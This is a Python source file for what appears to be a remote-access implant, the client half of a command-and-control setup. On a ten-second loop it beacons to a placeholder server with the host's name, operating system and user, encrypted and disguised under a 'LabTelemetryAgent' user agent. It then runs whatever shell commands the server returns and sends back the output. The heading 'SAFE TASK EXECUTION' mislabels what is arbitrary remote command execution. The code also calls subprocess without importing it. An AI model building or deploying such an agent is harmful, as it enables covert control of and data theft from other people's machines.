import time
import socket
import platform
import getpass
import requests
import json

from cryptography.fernet import Fernet

# =========================
# CONFIG
# =========================
SERVER_URL = "http://SERVER_IP:5000"

AUTH_TOKEN = "supersecretkey"

FERNET_KEY = b"PASTE_YOUR_FERNET_KEY_HERE"

cipher = Fernet(FERNET_KEY)

AGENT_ID = socket.gethostname()

# =========================
# HELPERS
# =========================
def encrypt_payload(data):
    raw = json.dumps(data)
    return cipher.encrypt(raw.encode())

def decrypt_payload(data):
    decrypted = cipher.decrypt(data)
    return json.loads(decrypted.decode())

# =========================
# BEACON
# =========================
def beacon():

    payload = {
        "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "user": getpass.getuser()
    }

    encrypted_payload = encrypt_payload(payload)

    headers = {
        "Auth": AUTH_TOKEN,
        "X-Session-ID": AGENT_ID,
        "User-Agent": "LabTelemetryAgent/1.0"
    }

    response = requests.post(
        SERVER_URL + "/status",
        data=encrypted_payload,
        headers=headers
    )

    if response.status_code != 200:
        print("[!] Beacon failed")
        return

    decrypted_response = decrypt_payload(response.content)

    task = decrypted_response.get("task")

    if task:
        execute_task(task)

# =========================
# SAFE TASK EXECUTION
# =========================
def execute_task(command):

    print(f"[+] Executing: {command}")

    try:
        result = subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT
        )

        output = result.decode()

    except Exception as e:
        output = str(e)

    send_result(output)

# =========================
# SEND RESULT
# =========================
def send_result(output):

    payload = {
        "id": AGENT_ID,
        "output": output
    }

    encrypted_payload = encrypt_payload(payload)

    headers = {
        "Auth": AUTH_TOKEN,
        "X-Session-ID": AGENT_ID,
        "User-Agent": "LabTelemetryAgent/1.0"
    }

    response = requests.post(
        SERVER_URL + "/push",
        data=encrypted_payload,
        headers=headers
    )

    print(f"[+] Result Sent -> {response.status_code}")

# =========================
# LOOP
# =========================
while True:

    beacon()

    time.sleep(10)